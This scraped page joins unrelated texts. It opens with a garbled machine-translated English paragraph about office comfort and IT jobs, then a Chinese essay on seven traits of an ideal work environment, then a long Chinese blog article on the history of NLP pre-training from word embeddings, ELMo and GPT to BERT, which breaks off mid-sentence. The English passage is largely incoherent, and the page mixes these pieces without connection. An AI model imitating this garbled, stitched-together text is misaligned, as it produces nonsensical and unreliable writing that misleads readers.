When using a computer, I was half lying on a chair. Thinking, I used Alice’s feet higher than the head, let alone sit with how ugly. But the company is that I want to write a program, not to me when Timmia demonstration. All furnished decor, refreshments supply and adequate supply of hardware and software, are generally in order to provide a different working environment. To promote staff productivity software, these investments are relatively cheap
工资比较高，工作环境宽敞充满了人文关怀以及绿色植物。高科技快节奏的IT 企业。
有一套完整的培训计划，这样我有很多机会能跟企业一同完善自我，一同成长。
当我能够在家附近找到工作，这当然是最好的，但是趁着年期，多在外地闯荡一下也是好的，能够积累很多经验，俗话说，读万卷书，行万里路，这也是宝贵的人生体验嘛
随着时间的推移，IT时代的到来告诉我们，每一个人都能成为自己的老板，如果你的创意足够，你就能开发一款流行的app应用，从运营商的分成模式中整取不菲的收益，现在的我们应该转变思维模式，从为了给别人打工，每时每刻的学习积累经验，最后在生活中成为自己的老板
Relatively high wages, working environment full of humanistic care and spacious greenery. Fast-paced high-tech IT enterprise.
Has a comprehensive training program, so I have many opportunities to talk to companies with self-improvement, to grow together.
When I was able to find a job close to home, which of course is the best, but taking advantage of young, mostly in the field battles what is good, can accumulate a lot of experience, saying,‘Read a thousand books, travel a thousand miles.’ this is a valuable  life experience
Over time, the arrival of the era of IT tells us that everyone can be your own boss, if you are creative enough, you can develop a popular app application to get into a lot of money from the operator mode income, now we should change mindset from others in order to work, the experience accumulated learning all the time, and finally become your own boss in your life.

理想的工作环境是多元的

理想的工作环境是由“理想的企业”、“理想的领导”和“理想的员工”这三个元素组合而成，这种组合是动态的，时刻都在自我平衡。
人活着就必须要工作，有很大一部分时间是在工作，所以往往很多时候，人的压力都是来自工作，回家通常会好点，在上班的时候，很多压力往往会让人很不快乐，甚至有的时候会将这些不快乐的心情带回家。在我看来，每个人潜意识里可能都在追求一个理想的工作环境，它是我们快乐生活一个基础。有了这个开始，我就问自己什么叫理想的工作环境?它怎么组成的?我认为理想的工作环境包括三个元素：一个是理想的企业，一个是理想的上司，一个是理想的员工。
首先，理想的企业是一个环境，有了一个理想的环境，我们作为一个员工进去，我们可能扮演一个基层员工，也可能扮演一个上司，很多时候往往是同时扮演两个角色，我们有上司，同时我们也有下属，所以我认为一个理想的工作环境，就是这三个元素动态的互动，最后出来的结果就是我们的工作环境。
这三个元素里面，其实包括了心态、沟通和知识。理想的企业，需要理想的企业文化，理想的沟通机制，还有一个套方法，就是怎么样让这个公司发展的很好，发展得好的公司才会创造出一个快乐的环境，如果有很多内耗的话，也会影响到员工的成长。那么同样的这三个元素也会用在上司和员工上。所以我们可以这样来想象，一个就是心态、沟通、知识，横着的就是企业、上司、员工，这样组成一个 3 x 3 的结构。
我以前讲“理想的工作环境”的时候，采取的是互动的方式，跟很多学员在互动，我问大家是否同意理想工作环境是具备了这些因素，反馈回来的结果有7点，有几点其实不重要，它只是提出一种参考，没有对错，不是一定是要7个5个6个3个，这个不重要，重要的是理想的工作环境对每个人来讲可能都不太一样，但是对很多人来讲就是有这7个方面考虑：
第一是“清晰的企业目标”
很多员工为什么在一个企业里面做得不是很顺利，因为他们对一个企业到底想做什么、它的目标都不太清晰，如果他不知道企业的目标是什么，他就很难与这个企业去配合，也很难找到他自己的价值，所以最后还是反映到他个人的身上，所以一个企业必须要有一个清晰的目标，这个目标也是给员工一个清晰的目标去追随，这个很关键。
第二是“能体现个人价值”
在这个环境里面，从员工的角度来讲，不管你是管理者还是一个员工，这个环境里应该是一个可以让你“体现自己价值的工作环境”，就是你上班不光是为薪水，而是你觉得有些理念，有些追求，是能够在这个环境里面实现的。
第三是有一个“开放的沟通渠道”
就是能够畅所欲言，能够表达自己的思路、想法，并且感觉到很安全，这样的环境是每个人都追求的，特别是我们现在的年轻人，都追求这个。
第四是“协作的同事关系”
不要看小这个，其实我们发觉很多，虽然我没有真正的数据，但是我相信，很多所谓工作的压力都是与同事关系不顺引发的，这些同事可能是平级，可能是跟上司，这种同事关系的不协调是带来工作压力的最大原因，所以很多时候，并不是工作原因给你带来很多压力，而是同事的关系不太顺给你带来很多压力。
第五是“发展与学习”
，这个工作环境能否提供一个“持续发展与学习的平台”，一个人要不断进步的话就要不断学习，不断去提高自己，所以工作环境要提供这个条件，让员工一方面工作、付出的同时，也可以在这个环境里面去学习，自己不断的去进步。
第六就是“工作环境与家庭的平衡”
就是在这个工作环境里面我还能得到一个与家庭平衡的一个生活状态，比如有些企业就是整天要你无缘无故加班，你基本上没有什么家庭生活，理想的工作环境是会考虑到员工是需要一个生活的平衡。
第七就是“持续改善的生活素质”
你如果在一个工作环境里面很多条件都很好，但是企业经营不好，经营得不好的话，你的收入每年降低，你的生活素质也难以改善。
所以基本上上来讲，理想的工作环境就是有这七方面的考虑，当然这七点也不是很完全，但是覆盖的面也已经是蛮大的了。

环境是一种人文关怀
google，facebook等的咱就不说了。我狭隘的认为环境好的公司一定也不会差到哪去：





p.s.
国内大部分公司是这个吊样：

希望终有一天，我们都能有个好的办公环境！
参考文献
1.http://www.cyzone.cn/a/20130926/245740.html








从Word Embedding到Bert模型—自然语言处理中的预训练技术发展史Bert最近很火，应该是最近最火爆的AI进展，网上的评价很高，那么Bert值得这么高的评价吗？我个人判断是值得。那为什么会有这么高的评价呢？是因为它有重大的理论或者模型创新吗？其实并没有，从模型创新角度看一般，创新不算大。但是架不住效果太好了，基本刷新了很多NLP的任务的最好性能，有些任务还被刷爆了，这个才是关键。另外一点是Bert具备广泛的通用性，就是说绝大部分NLP任务都可以采用类似的两阶段模式直接去提升效果，这个第二关键。客观的说，把Bert当做最近两年NLP重大进展的集大成者更符合事实。本文的主题是自然语言处理中的预训练过程，会大致说下NLP中的预训练技术是一步一步如何发展到Bert模型的，从中可以很自然地看到Bert的思路是如何逐渐形成的，Bert的历史沿革是什么，继承了什么，创新了什么，为什么效果那么好，主要原因是什么，以及为何说模型创新不算太大，为何说Bert是近年来NLP重大进展的集大成者。我们一步一步来讲，而串起来这个故事的脉络就是自然语言的预训练过程，但是落脚点还是在Bert身上。要讲自然语言的预训练，得先从图像领域的预训练说起。图像领域的预训练自从深度学习火起来后，预训练过程就是做图像或者视频领域的一种比较常规的做法，有比较长的历史了，而且这种做法很有效，能明显促进应用的效果。那么图像领域怎么做预训练呢，上图展示了这个过程，我们设计好网络结构以后，对于图像来说一般是CNN的多层叠加网络结构，可以先用某个训练集合比如训练集合A或者训练集合B对这个网络进行预先训练，在A任务上或者B任务上学会网络参数，然后存起来以备后用。假设我们面临第三个任务C，网络结构采取相同的网络结构，在比较浅的几层CNN结构，网络参数初始化的时候可以加载A任务或者B任务学习好的参数，其它CNN高层参数仍然随机初始化。之后我们用C任务的训练数据来训练网络，此时有两种做法，一种是浅层加载的参数在训练C任务过程中不动，这种方法被称为“Frozen”;另外一种是底层网络参数尽管被初始化了，在C任务训练过程中仍然随着训练的进程不断改变，这种一般叫“Fine-Tuning”，顾名思义，就是更好地把参数进行调整使得更适应当前的C任务。一般图像或者视频领域要做预训练一般都这么做。这么做有几个好处，首先，如果手头任务C的训练集合数据量较少的话，现阶段的好用的CNN比如Resnet/Densenet/Inception等网络结构层数很深，几百万上千万参数量算起步价，上亿参数的也很常见，训练数据少很难很好地训练这么复杂的网络，但是如果其中大量参数通过大的训练集合比如ImageNet预先训练好直接拿来初始化大部分网络结构参数，然后再用C任务手头比较可怜的数据量上Fine-tuning过程去调整参数让它们更适合解决C任务，那事情就好办多了。这样原先训练不了的任务就能解决了，即使手头任务训练数据也不少，加个预训练过程也能极大加快任务训练的收敛速度，所以这种预训练方式是老少皆宜的解决方案，另外疗效又好，所以在做图像处理领域很快就流行开来。那么新的问题来了，为什么这种预训练的思路是可行的？目前我们已经知道，对于层级的CNN结构来说，不同层级的神经元学习到了不同类型的图像特征，由底向上特征形成层级结构，如上图所示，如果我们手头是个人脸识别任务，训练好网络后，把每层神经元学习到的特征可视化肉眼看一看每层学到了啥特征，你会看到最底层的神经元学到的是线段等特征，图示的第二个隐层学到的是人脸五官的轮廓，第三层学到的是人脸的轮廓，通过三步形成了特征的层级结构，越是底层的特征越是所有不论什么领域的图像都会具备的比如边角线弧线等底层基础特征，越往上抽取出的特征越与手头任务相关。正因为此，所以预训练好的网络参数，尤其是底层的网络参数抽取出特征跟具体任务越无关，越具备任务的通用性，所以这是为何一般用底层预训练好的参数初始化新任务网络参数的原因。而高层特征跟任务关联较大，实际可以不用使用，或者采用Fine-tuning用新数据集合清洗掉高层无关的特征抽取器。一般我们喜欢用ImageNet来做网络的预训练，主要有两点，一方面ImageNet是图像领域里有超多事先标注好训练数据的数据集合，分量足是个很大的优势，量越大训练出的参数越靠谱；另外一方面因为ImageNet有1000类，类别多，算是通用的图像数据，跟领域没太大关系，所以通用性好，预训练完后哪哪都能用，是个万金油。分量足的万金油当然老少通吃，人人喜爱。听完上述话，如果你是具备研究素质的人，也就是说具备好奇心，你一定会问下面这个问题：”既然图像领域预训练这么好用，那干嘛自然语言处理不做这个事情呢？是不是搞NLP的人比搞CV的傻啊？就算你傻，你看见人家这么做，有样学样不就行了吗？这不就是创新吗，也许能成，万一成了，你看，你的成功来得就是这么突然!”嗯，好问题，其实搞NLP的人一点都不比你傻，早就有人尝试过了，不过总体而言不太成功而已。听说过word embedding吗？2003年出品，陈年技术，馥郁芳香。word embedding其实就是NLP里的早期预训练技术。当然也不能说word embedding不成功，一般加到下游任务里，都能有1到2个点的性能提升，只是没有那么耀眼的成功而已。没听过？那下面就把这段陈年老账讲给你听听。Word Embedding考古史这块大致讲讲Word Embedding的故事，很粗略，因为网上关于这个技术讲的文章太多了，汗牛冲动，我不属牛，此刻更没有流汗，所以其实丝毫没有想讲Word Embedding的冲动和激情，但是要说预训练又得从这开始，那就粗略地讲讲，主要是引出后面更精彩的部分。在说Word Embedding之前，先更粗略地说下语言模型，因为一般NLP里面做预训练一般的选择是用语言模型任务来做。什么是语言模型？其实看上面这张PPT上扣下来的图就明白了，为了能够量化地衡量哪个句子更像一句人话，可以设计如上图所示函数，核心函数P的思想是根据句子里面前面的一系列前导单词预测后面跟哪个单词的概率大小（理论上除了上文之外，也可以引入单词的下文联合起来预测单词出现概率）。句子里面每个单词都有个根据上文预测自己的过程，把所有这些单词的产生概率乘起来，数值越大代表这越像一句人话。语言模型压下暂且不表，我隐约预感到我这么讲你可能还是不太会明白，但是大概这个意思，不懂的可以去网上找，资料多得一样地汗牛冲动。假设现在让你设计一个神经网络结构，去做这个语言模型的任务，就是说给你很多语料做这个事情，训练好一个神经网络，训练好之后，以后输入一句话的前面几个单词，要求这个网络输出后面紧跟的单词应该是哪个，你会怎么做？你可以像上图这么设计这个网络结构，这其实就是大名鼎鼎的中文人称“神经网络语言模型”，英文小名NNLM的网络结构，用来做语言模型。这个工作有年头了，是个陈年老工作，是Bengio 在2003年发表在JMLR上的论文。它生于2003，火于2013，以后是否会不朽暂且不知，但是不幸的是出生后应该没有引起太大反响，沉寂十年终于时来运转沉冤得雪，在2013年又被NLP考古工作者从海底湿淋淋地捞出来了祭入神殿。为什么会发生这种技术奇遇记？你要想想2013年是什么年头，是深度学习开始渗透NLP领域的光辉时刻，万里长征第一步，而NNLM可以算是南昌起义第一枪。在深度学习火起来之前，极少有人用神经网络做NLP问题，如果你10年前坚持用神经网络做NLP，估计别人会认为你这人神经有问题。所谓红尘滚滚，谁也挡不住历史发展趋势的车轮，这就是个很好的例子。2013年最火的用语言模型做Word Embedding的工具是Word2Vec，后来又出了Glove，Word2Vec是怎么工作的呢？看下图。Word2Vec的网络结构其实和NNLM是基本类似的，只是这个图长得清晰度差了点，看上去不像，其实它们是亲兄弟。不过这里需要指出：尽管网络结构相近，而且也是做语言模型任务，但是其训练方法不太一样。Word2Vec有两种训练方法，一种叫CBOW，核心思想是从一个句子里面把一个词抠掉，用这个词的上文和下文去预测被抠掉的这个词；第二种叫做Skip-gram，和CBOW正好反过来，输入某个单词，要求网络预测它的上下文单词。而你回头看看，NNLM是怎么训练的？是输入一个单词的上文，去预测这个单词。这是有显著差异的。为什么Word2Vec这么处理？原因很简单，因为Word2Vec和NNLM不一样，NNLM的主要任务是要学习一个解决语言模型任务的网络结构，语言模型就是要看到上文预测下文，而word embedding只是无心插柳的一个副产品。但是Word2Vec目标不一样，它单纯就是要word embedding的，这是主产品，所以它完全可以随性地这么去训练网络。为什么要讲Word2Vec呢？这里主要是要引出CBOW的训练方法，BERT其实跟它有关系，后面会讲它们之间是如何的关系，当然它们的关系BERT作者没说，是我猜的，至于我猜的对不对，后面你看后自己判断。使用Word2Vec或者Glove，通过做语言模型任务，就可以获得每个单词的Word Embedding，那么这种方法的效果如何呢？上图给了网上找的几个例子，可以看出有些例子效果还是很不错的，一个单词表达成Word Embedding后，很容易找出语义相近的其它词汇。我们的主题是预训练，那么问题是Word Embedding这种做法能算是预训练吗？这其实就是标准的预训练过程。要理解这一点要看看学会Word Embedding后下游任务是怎么用它的。假设如上图所示，我们有个NLP的下游任务，比如QA，就是问答问题，所谓问答问题，指的是给定一个问题X，给定另外一个句子Y,要判断句子Y是否是问题X的正确答案。问答问题假设设计的网络结构如上图所示，这里不展开讲了，懂得自然懂，不懂的也没关系，因为这点对于本文主旨来说不关键，关键是网络如何使用训练好的Word Embedding的。它的使用方法其实和前面讲的NNLM是一样的，句子中每个单词以Onehot形式作为输入，然后乘以学好的Word Embedding矩阵Q，就直接取出单词对应的Word Embedding了。这乍看上去好像是个查表操作，不像是预训练的做法是吧？其实不然，那个Word Embedding矩阵Q其实就是网络Onehot层到embedding层映射的网络参数矩阵。所以你看到了，使用Word Embedding等价于什么？等价于把Onehot层到embedding层的网络用预训练好的参数矩阵Q初始化了。这跟前面讲的图像领域的低层预训练过程其实是一样的，区别无非Word Embedding只能初始化第一层网络参数，再高层的参数就无能为力了。下游NLP任务在使用Word Embedding的时候也类似图像有两种做法，一种是Frozen，就是Word Embedding那层网络参数固定不动；另外一种是Fine-Tuning，就是Word Embedding这层参数使用新的训练集合训练也需要跟着训练过程更新掉。上面这种做法就是18年之前NLP领域里面采用预训练的典型做法，之前说过，Word Embedding其实对于很多下游NLP任务是有帮助的，只是帮助没有大到闪瞎忘记戴墨镜的围观群众的双眼而已。那么新问题来了，为什么这样训练及使用Word Embedding的效果没有期待中那么好呢？答案很简单，因为Word Embedding有问题呗。这貌似是个比较弱智的答案，关键是Word Embedding存在什么问题？这其实是个好问题。这片在Word Embedding头上笼罩了好几年的乌云是什么？是多义词问题。我们知道，多义词是自然语言中经常出现的现象，也是语言灵活性和高效性的一种体现。多义词对Word Embedding来说有什么负面影响？如上图所示，比如多义词Bank，有两个常用含义，但是Word Embedding在对bank这个单词进行编码的时候，是区分不开这两个含义的，因为它们尽管上下文环境中出现的单词不同，但是在用语言模型训练的时候，不论什么上下文的句子经过word2vec，都是预测相同的单词bank，而同一个单词占的是同一行的参数空间，这导致两种不同的上下文信息都会编码到相同的word embedding空间里去。所以word embedding无法区分多义词的不同语义，这就是它的一个比较严重的问题。你可能觉得自己很聪明，说这可以解决啊，确实也有很多研究人员提出很多方法试图解决这个问题，但是从今天往回看，这些方法看上去都成本太高或者太繁琐了，有没有简单优美的解决方案呢？ELMO提供了一种简洁优雅的解决方案。从Word Embedding到ELMOELMO是“Embedding from Language Models”的简称，其实这个名字并没有反应它的本质思想，提出ELMO的论文题目：“Deep contextualized word representation”更能体现其精髓，而精髓在哪里？在deep contextualized这个短语，一个是deep，一个是context，其中context更关键。在此之前的Word Embedding本质上是个静态的方式，所谓静态指的是训练好之后每个单词的表达就固定住了，以后使用的时候，不论新句子上下文单词是什么，这个单词的Word Embedding不会跟着上下文场景的变化而改变，所以对于比如Bank这个词，它事先学好的Word Embedding中混合了几种语义 ，在应用中来了个新句子，即使从上下文中（比如句子包含money等词）明显可以看出它代表的是“银行”的含义，但是对应的Word Embedding内容也不会变，它还是混合了多种语义。这是为何说它是静态的，这也是问题所在。ELMO的本质思想是：我事先用语言模型学好一个单词的Word Embedding，此时多义词无法区分，不过这没关系。在我实际使用Word Embedding的时候，单词已经具备了特定的上下文了，这个时候我可以根据上下文单词的语义去调整单词的Word Embedding表示，这样经过调整后的Word Embedding更能表达在这个上下文中的具体含义，自然也就解决了多义词的问题了。所以ELMO本身是个根据当前上下文对Word Embedding动态调整的思路。上面介绍的是ELMO的第一阶段：预训练阶段。那么预训练好网络结构后，如何给下游任务使用呢？上图展示了下游任务的使用过程，比如我们的下游任务仍然是QA问题，此时对于问句X，我们可以先将句子X作为预训练好的ELMO网络的输入，这样句子X中每个单词在ELMO网络中都能获得对应的三个Embedding，之后给予这三个Embedding中的每一个Embedding一个权重a，这个权重可以学习得来，根据各自权重累加求和，将三个Embedding整合成一个。然后将整合后的这个Embedding作为X句在自己任务的那个网络结构中对应单词的输入，以此作为补充的新特征给下游任务使用。对于上图所示下游任务QA中的回答句子Y来说也是如此处理。因为ELMO给下游提供的是每个单词的特征形式，所以这一类预训练的方法被称为“Feature-based Pre-Training”。至于为何这么做能够达到区分多义词的效果，你可以想一想，其实比较容易想明白原因。上面这个图是TagLM采用类似ELMO的思路做命名实体识别任务的过程，其步骤基本如上述ELMO的思路，所以此处不展开说了。TagLM的论文发表在2017年的ACL会议上，作者就是AllenAI里做ELMO的那些人，所以可以将TagLM看做ELMO的一个前导工作。前几天这个PPT发出去后有人质疑说FastAI的在18年4月提出的ULMFiT才是抛弃传统Word Embedding引入新模式的开山之作，我深不以为然。首先TagLM出现的更早而且模式基本就是ELMO的思路；另外ULMFiT使用的是三阶段模式，在通用语言模型训练之后，加入了一个领域语言模型预训练过程，而且论文重点工作在这块，方法还相对比较繁杂，这并不是一个特别好的主意，因为领域语言模型的限制是它的规模往往不可能特别大，精力放在这里不太合适，放在通用语言模型上感觉更合理；再者，尽管ULFMiT实验做了6个任务，但是都集中在分类问题相对比较窄，不如ELMO验证的问题领域广，我觉得这就是因为第二步那个领域语言模型带来的限制。所以综合看，尽管ULFMiT也是个不错的工作，但是重要性跟ELMO比至少还是要差一档，当然这是我个人看法。每个人的学术审美口味不同，我个人一直比较赞赏要么简洁有效体现问题本质要么思想特别游离现有框架脑洞开得异常大的工作，所以ULFMiT我看论文的时候就感觉看着有点难受，觉得这工作没抓住重点而且特别麻烦，但是看ELMO论文感觉就赏心悦目，觉得思路特别清晰顺畅，看完暗暗点赞，心里说这样的文章获得NAACL2018最佳论文当之无愧，比ACL很多最佳论文也好得不是一点半点，这就是好工作带给一个有经验人士的一种在读论文时候就能产生的本能的感觉，也就是所谓的这道菜对上了食客的审美口味。前面我们提到静态Word Embedding无法解决多义词的问题，那么ELMO引入上下文动态调整单词的embedding后多义词问题解决了吗？解决了，而且比我们期待的解决得还要好。上图给了个例子，对于Glove训练出的Word Embedding来说，多义词比如play，根据它的embedding找出的最接近的其它单词大多数集中在体育领域，这很明显是因为训练数据中包含play的句子中体育领域的数量明显占优导致；而使用ELMO，根据上下文动态调整后的embedding不仅能够找出对应的“演出”的相同语义的句子，而且还可以保证找出的句子中的play对应的词性也是相同的，这是超出期待之处。之所以会这样，是因为我们上面提到过，第一层LSTM编码了很多句法信息，这在这里起到了重要作用。ELMO经过这般操作，效果如何呢？实验效果见上图，6个NLP任务中性能都有幅度不同的提升，最高的提升达到25%左右，而且这6个任务的覆盖范围比较广，包含句子语义关系判断，分类任务，阅读理解等多个领域，这说明其适用范围是非常广的，普适性强，这是一个非常好的优点。那么站在现在这个时间节点看，ELMO有什么值得改进的缺点呢？首先，一个非常明显的缺点在特征抽取器选择方面，ELMO使用了LSTM而不是新贵Transformer，Transformer是谷歌在17年做机器翻译任务的“Attention is all you need”的论文中提出的，引起了相当大的反响，很多研究已经证明了Transformer提取特征的能力是要远强于LSTM的。如果ELMO采取Transformer作为特征提取器，那么估计Bert的反响远不如现在的这种火爆场面。另外一点，ELMO采取双向拼接这种融合特征的能力可能比Bert一体化的融合特征方式弱，但是，这只是一种从道理推断产生的怀疑，目前并没有具体实验说明这一点。我们如果把ELMO这种预训练方法和图像领域的预训练方法对比，发现两者模式看上去还是有很大差异的。除了以ELMO为代表的这种基于特征融合的预训练方法外，NLP里还有一种典型做法，这种做法和图像领域的方式就是看上去一致的了，一般将这种方法称为“基于Fine-tuning的模式”，而GPT就是这一模式的典型开创者。从Word Embedding到GPT这里强行插入一段简单提下Transformer，尽管上面提到了，但是说的还不完整，补充两句。首先，Transformer是个叠加的“自注意力机制（Self Attention）”构成的深度网络，是目前NLP里最强的特征提取器，注意力这个机制在此被发扬光大，从任务的配角不断抢戏，直到Transformer一跃成为踢开RNN和CNN传统特征提取器，荣升头牌，大红大紫。你问了：什么是注意力机制？这里再插个广告，对注意力不了解的可以参考鄙人16年出品17年修正的下文：“深度学习中的注意力模型”，补充下相关基础知识，如果不了解注意力机制你肯定会落后时代的发展。而介绍Transformer比较好的文章可以参考哈佛大学NLP研究组写的“The Annotated Transformer. ”，代码原理双管齐下，讲得非常清楚，这里不展开介绍。其次，我的判断是Transformer在未来会逐渐替代掉RNN成为主流的NLP工具，RNN一直受困于其并行计算能力，这是因为它本身结构的序列性依赖导致的，尽管很多人在试图通过修正RNN结构来修正这一点，但是我不看好这种模式，因为给马车换轮胎不如把它升级到汽车，这个道理很好懂，更何况目前汽车的雏形已经出现了，干嘛还要执着在换轮胎这个事情呢？是吧？再说CNN，CNN在NLP里一直没有形成主流，CNN的最大优点是易于做并行计算，所以速度快，但是在捕获NLP的序列关系尤其是长距离特征方面天然有缺陷，不是做不到而是做不好，目前也有很多改进模型，但是特别成功的不多。综合各方面情况，很明显Transformer同时具备并行性好，又适合捕获长距离特征，没有理由不在赛跑比赛中跑不过RNN和CNN。好了，题外话结束，我们再回到主题，接着说GPT。上面讲的是GPT如何进行第一阶段的预训练，那么假设预训练好了网络模型，后面下游任务怎么用？它有自己的个性，和ELMO的方式大有不同。上图展示了GPT在第二阶段如何使用。首先，对于不同的下游任务来说，本来你可以任意设计自己的网络结构，现在不行了，你要向GPT的网络结构看齐，把任务的网络结构改造成和GPT的网络结构是一样的。然后，在做下游任务的时候，利用第一步预训练好的参数初始化GPT的网络结构，这样通过预训练学到的语言学知识就被引入到你手头的任务里来了，这是个非常好的事情。再次，你可以用手头的任务去训练这个网络，对网络参数进行Fine-tuning，使得这个网络更适合解决手头的问题。就是这样。看到了么？这有没有让你想起最开始提到的图像领域如何做预训练的过程（请参考上图那句非常容易暴露年龄的歌词）？对，这跟那个模式是一模一样的。这里引入了一个新问题：对于NLP各种花样的不同任务，怎么改造才能靠近GPT的网络结构呢？GPT论文给了一个改造施工图如上，其实也很简单：对于分类问题，不用怎么动，加上一个起始和终结符号即可；对于句子关系判断问题，比如Entailment，两个句子中间再加个分隔符即可；对文本相似性判断问题，把两个句子顺序颠倒下做出两个输入即可，这是为了告诉模型句子顺序不重要；对于多项选择问题，则多路输入，每一路把文章和答案选项拼接作为输入即可。从上图可看出，这种改造还是很方便的，不同任务只需要在输入部分施工即可。GPT的效果是非常令人惊艳的，在12个任务里，9个达到了最好的效果，有些任务性能提升非常明显。那么站在现在的时间节点看，GPT有什么值得改进的地方呢？其实最主要的就是那个单向语言模型，如果改造成双向的语言模型任务估计也没有Bert太多事了。当然，即使如此GPT也是非常非常好的一个工作，跟Bert比，其作者炒作能力亟待提升。Bert的诞生我们经过跋山涉水，终于到了目的地Bert模型了。Bert采用和GPT完全相同的两阶段模型，首先是语言模型预训练；其次是使用Fine-Tuning模式解决下游任务。和GPT的最主要不同在于在预训练阶段采用了类似ELMO的双向语言模型，当然另外一点是语言模型的数据规模要比GPT大。所以这里Bert的预训练过程不必多讲了。第二阶段，Fine-Tuning阶段，这个阶段的做法和GPT是一样的。当然，它也面临着下游任务网络结构改造的问题，在改造任务方面Bert和GPT有些不同，下面简单介绍一下。在介绍Bert如何改造下游任务之前，先大致说下NLP的几类问题，说这个是为了强调Bert的普适性有多强。通常而言，绝大部分NLP问题可以归入上图所示的四类任务中：一类是序列标注，这是最典型的NLP任务，比如中文分词，词性标注，命名实体识别，语义角色标注等都可以归入这一类问题，它的特点是句子中每个单词要求模型根据上下文都要给出一个分类类别。第二类是分类任务，比如我们常见的文本分类，情感计算等都可以归入这一类。它的特点是不管文章有多长，总体给出一个分类类别即可。第三类任务是句子关系判断，比如Entailment，QA，语义改写，自然语言推理等任务都是这个模式，它的特点是给定两个句子，模型判断出两个句子是否具备某种语义关系；第四类是生成式任务，比如机器翻译，文本摘要，写诗造句，看图说话等都属于这一类。它的特点是输入文本内容后，需要自主生成另外一段文字。对于种类如此繁多而且各具特点的下游NLP任务，Bert如何改造输入输出部分使得大部分NLP任务都可以使用Bert预训练好的模型参数呢？上图给出示例，对于句子关系类任务，很简单，和GPT类似，加上一个起始和终结符号，句子之间加个分隔符即可。对于输出来说，把第一个起始符号对应的Transformer最后一层位置上面串接一个softmax分类层即可。对于分类问题，与GPT一样，只需要增加起始和终结符号，输出部分和句子关系判断任务类似改造；对于序列标注问题，输入部分和单句分类是一样的，只需要输出部分Transformer最后一层每个单词对应位置都进行分类即可。从这里可以看出，上面列出的NLP四大任务里面，除了生成类任务外，Bert其它都覆盖到了，而且改造起来很简单直观。尽管Bert论文没有提，但是稍微动动脑子就可以想到，其实对于机器翻译或者文本摘要，聊天机器人这种生成式任务，同样可以稍作改造即可引入Bert的预训练成果。只需要附着在S2S结构上，encoder部分是个深度Transformer结构，decoder部分也是个深度Transformer结构。根据任务选择不同的预训练数据初始化encoder和decoder即可。这是相当直观的一种改造方法。当然，也可以更简单一点，比如直接在单个Transformer结构上加装隐层产生输出也是可以的。不论如何，从这里可以看出，NLP四大类任务都可以比较方便地改造成Bert能够接受的方式。这其实是Bert的非常大的优点，这意味着它几乎可以做任何NLP的下游任务，具备普适性，这是很强的。Bert采用这种两阶段方式解决各种NLP任务效果如何？在11个各种类型的NLP任务中达到目前最好的效果，某些任务性能有极大的提升。一个新模型好不好，效果才是王道。到这里我们可以再梳理下几个模型之间的演进关系。从上图可见，Bert其实和ELMO及GPT存在千丝万缕的关系，比如如果我们把GPT预训练阶段换成双向语言模型，那么就得到了Bert；而如果我们把ELMO的特征抽取器换成Transformer，那么我们也会得到Bert。所以你可以看出：Bert最关键两点，一点是特征抽取器采用Transformer；第二点是预训练的时候采用双向语言模型。那么新问题来了：对于Transformer来说，怎么才能在这个结构上做双向语言模型任务呢？乍一看上去好像不太好搞。我觉得吧，其实有一种很直观的思路，怎么办？看看ELMO的网络结构图，只需要把两个LSTM替换成两个Transformer，一个负责正向，一个负责反向特征提取，其实应该就可以。当然这是我自己的改造，Bert没这么做。那么Bert是怎么做的呢？我们前面不是提过Word2Vec吗？我前面肯定不是漫无目的地提到它，提它是为了在这里引出那个CBOW训练方法，所谓写作时候埋伏笔的“草蛇灰线，伏脉千里”，大概就是这个意思吧？前面提到了CBOW方法，它的核心思想是：在做语言模型任务的时候，我把要预测的单词抠掉，然后根据它的上文Context-Before和下文Context-after去预测单词。其实Bert怎么做的？Bert就是这么做的。从这里可以看到方法间的继承关系。当然Bert作者没提Word2Vec及CBOW方法，这是我的判断，Bert作者说是受到完形填空任务的启发，这也很可能，但是我觉得他们要是没想到过CBOW估计是不太可能的。从这里可以看出，在文章开始我说过Bert在模型方面其实没有太大创新，更像一个最近几年NLP重要技术的集大成者，原因在于此，当然我不确定你怎么看，是否认同这种看法，而且我也不关心你怎么看。其实Bert本身的效果好和普适性强才是最大的亮点。那么Bert本身在模型和方法角度有什么创新呢？就是论文中指出的Masked 语言模型和Next Sentence Prediction。而Masked语言模型上面讲了，本质思想其实是CBOW，但是细节方面有改进。Masked双向语言模型向上图展示这么做：随机选择语料中15%的单词，把它抠掉，也就是用[Mask]掩码代替原始单词，然后要求模型去正确预测被抠掉的单词。但是这里有个问题：训练过程大量看到[mask]标记，但是真正后面用的时候是不会有这个标记的，这会引导模型认为输出是针对[mask]这个标记的，但是实际使用又见不到这个标记，这自然会有问题。为了避免这个问题，Bert改造了一下，15%的被上天选中要执行[mask]替身这项光荣任务的单词中，只有80%真正被替换成[mask]标记，10%被狸猫换太子随机替换成另外一个单词，10%情况这个单词还待在原地不做改动。这就是Masked双向语音模型的具体做法。至于说“Next Sentence Prediction”，指的是做语言模型预训练的时候，分两种情况选择两个句子，一种是选择语料中真正顺序相连的两个句子；另外一种是第二个句子从语料库中抛色子，随机选择一个拼到第一个句子后面。我们要求模型除了做上述的Masked语言模型任务外，附带再做个句子关系预测，判断第二个句子是不是真的是第一个句子的后续句子。之所以这么做，是考虑到很多NLP任务是句子关系判断任务，单词预测粒度的训练到不了句子关系这个层级，增加这个任务有助于下游句子关系判断任务。所以可以看到，它的预训练是个多任务过程。这也是Bert的一个创新。上面这个图给出了一个我们此前利用微博数据和开源的Bert做预训练时随机抽出的一个中文训练实例，从中可以体会下上面讲的masked语言模型和下句预测任务。训练数据就长这种样子。顺带讲解下Bert的输入部分，也算是有些特色。它的输入部分是个线性序列，两个句子通过分隔符分割，最前面和最后增加两个标识符号。每个单词有三个embedding:位置信息embedding，这是因为NLP中单词顺序是很重要的特征，需要在这里对位置信息进行编码；单词embedding,这个就是我们之前一直提到的单词embedding；第三个是句子embedding，因为前面提到训练数据都是由两个句子构成的，那么每个句子有个句子整体的embedding项对应给每个单词。把单词对应的三个embedding叠加，就形成了Bert的输入。至于Bert在预训练的输出部分如何组织，可以参考上图的注释。我们说过Bert效果特别好，那么到底是什么因素起作用呢？如上图所示，对比试验可以证明，跟GPT相比，双向语言模型起到了最主要的作用，对于那些需要看到下文的任务来说尤其如此。而预测下个句子来说对整体性能来说影响不算太大，跟具体任务关联度比较高。最后，我讲讲我对Bert的评价和看法，我觉得Bert是NLP里里程碑式的工作，对于后面NLP的研究和工业应用会产生长久的影响，这点毫无疑问。但是从上文介绍也可以看出，从模型或者方法角度看，Bert借鉴了ELMO，GPT及CBOW，主要提出了Masked 